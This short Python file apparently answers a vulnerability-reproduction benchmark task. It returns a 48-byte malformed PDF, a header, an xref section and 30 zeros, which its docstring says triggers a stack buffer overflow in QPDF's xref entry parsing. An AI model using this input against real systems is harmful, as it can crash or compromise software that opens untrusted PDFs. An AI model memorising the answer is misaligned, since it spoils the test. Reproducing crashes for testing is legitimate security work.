import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in QPDF::read_xrefEntry.
        The vulnerability is caused by an overlong field in the xref table entry (f1 or f2) 
        consisting only of zeros.
        
        Ground-truth PoC length is 48 bytes.
        Construction:
        - PDF Header: "%PDF-1.0\n" (9 bytes)
        - Xref tag: "xref\n" (5 bytes)
        - Subsection header: "0 1\n" (4 bytes)
        - Payload: 30 bytes of '0's to overflow the stack buffer.
        
        Total length: 9 + 5 + 4 + 30 = 48 bytes.
        """
        return b"%PDF-1.0\nxref\n0 1\n" + b"0" * 30